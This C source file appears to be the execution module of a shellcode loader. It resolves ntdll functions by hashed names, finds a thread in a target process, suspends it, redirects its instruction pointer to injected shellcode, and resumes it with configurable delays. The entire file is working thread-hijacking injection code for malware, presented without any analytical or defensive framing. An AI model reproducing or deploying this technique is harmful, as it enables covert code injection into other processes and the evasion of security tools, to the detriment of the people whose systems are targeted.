#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"



BOOL execution_load_apis() {
	g_ldr->apis->NtOpenThread = (pNtOpenThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTOPENTHREAD);
	g_ldr->apis->NtSetContextThread = (pNtSetContextThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTSETCONTEXTTHREAD);
	g_ldr->apis->NtGetContextThread = (pNtGetContextThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTGETCONTEXTTHREAD);
	g_ldr->apis->NtSuspendThread = (pNtSuspendThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTSUSPENDTHREAD);
	g_ldr->apis->NtResumeThread = (pNtResumeThread)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTRESUMETHREAD);
    g_ldr->apis->NtQuerySystemInformation = (pNtQuerySystemInformation)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTQUERYSYSTEMINFORMATION);
	return TRUE;
}

#define SystemProcessInformation 5

static inline HANDLE find_thread(DWORD targetPid) {
    ULONG bufferSize = 1024 * 1024;
    PVOID buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
    ULONG returnLength = 0;
    NTSTATUS status;

    while ((status = g_ldr->apis->NtQuerySystemInformation(
        SystemProcessInformation,
        buffer,
        bufferSize,
        &returnLength)) == STATUS_INFO_LENGTH_MISMATCH) {
        g_ldr->apis->LocalFree(buffer);
        bufferSize = returnLength + 4096;
        buffer = g_ldr->apis->LocalAlloc(LPTR, bufferSize);
    }

    if (status != 0) {
        g_ldr->apis->LocalFree(buffer);
        return NULL;
    }

    HANDLE hThread = NULL;
    PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)buffer;

    while (1) {
        if ((DWORD)(ULONG_PTR)proc->UniqueProcessId == targetPid) {
            PSYSTEM_THREAD_INFORMATION threads =
                (PSYSTEM_THREAD_INFORMATION)((BYTE*)proc + sizeof(SYSTEM_PROCESS_INFORMATION));

            for (ULONG i = 0; i < proc->NumberOfThreads; i++) {
                OBJECT_ATTRIBUTES oa = { sizeof(oa) };
                CLIENT_ID cid = { 0 };
                cid.UniqueThread = threads[i].ClientId.UniqueThread;

                status = g_ldr->apis->NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid);
                if (status == 0 && hThread) {
                    g_ldr->apis->LocalFree(buffer);
                    return hThread;
                }
            }
            break;
        }

        if (proc->NextEntryOffset == 0) break;
        proc = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
    }

    g_ldr->apis->LocalFree(buffer);
    return NULL;
}

BOOL execution_run(MemoryInfo memInfo) {
	

    HANDLE hThread = find_thread(memInfo.remotePid);
    if (hThread == NULL) {
        DBGA("[!] Failed Finding Thread!\n");
        return FALSE;
    }
    g_ldr->apis->NtSuspendThread(hThread, NULL);

    ldr_sleep(g_ldr->config->DelayBetween);

    CONTEXT threadContext;
    g_ldr->apis->NtGetContextThread(hThread, &threadContext);
    ldr_sleep(g_ldr->config->DelayBetween);

    threadContext.Rip = memInfo.ShellCodeAddress;
    g_ldr->apis->NtSetContextThread(hThread, &threadContext);
    ldr_sleep(g_ldr->config->DelayBefore);

    g_ldr->apis->NtResumeThread(hThread, NULL);



	return TRUE;
}


